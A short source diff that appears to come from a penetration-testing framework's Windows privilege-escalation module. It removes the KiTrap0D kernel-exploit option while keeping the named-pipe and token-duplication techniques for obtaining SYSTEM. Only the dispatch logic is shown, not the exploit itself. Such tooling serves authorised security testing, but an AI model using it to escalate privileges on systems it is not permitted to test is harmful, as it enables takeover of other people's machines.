@@ -5,7 +5,6 @@
 #include "precomp.h"
 #include "namedpipe.h"
 #include "tokendup.h"
-#include "kitrap0d.h"
 
 /*!
  * @brief Get the native architecture of the system we are running on. (ripped from the stdapi's ps.c)
@@ -102,14 +101,6 @@ DWORD elevate_getsystem( Remote * remote, Packet * packet )
 			dprintf( "[ELEVATE] Attempting ELEVATE_TECHNIQUE_SERVICE_TOKENDUP (%u)", ELEVATE_TECHNIQUE_SERVICE_TOKENDUP );
 			if ( (dwResult = elevate_via_service_tokendup( remote, packet )) == ERROR_SUCCESS ) {
 				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_TOKENDUP;
-				break;
-			}
-		}
-		
-		if( dwTechnique == ELEVATE_TECHNIQUE_ANY || dwTechnique == ELEVATE_TECHNIQUE_EXPLOIT_KITRAP0D ) {
-			dprintf( "[ELEVATE] Attempting ELEVATE_TECHNIQUE_EXPLOIT_KITRAP0D (%u)", ELEVATE_TECHNIQUE_EXPLOIT_KITRAP0D );
-			if ( (dwResult = elevate_via_exploit_kitrap0d( remote, packet )) == ERROR_SUCCESS ) {
-				dwTechnique = ELEVATE_TECHNIQUE_EXPLOIT_KITRAP0D;
 				break;
 			}
 		}
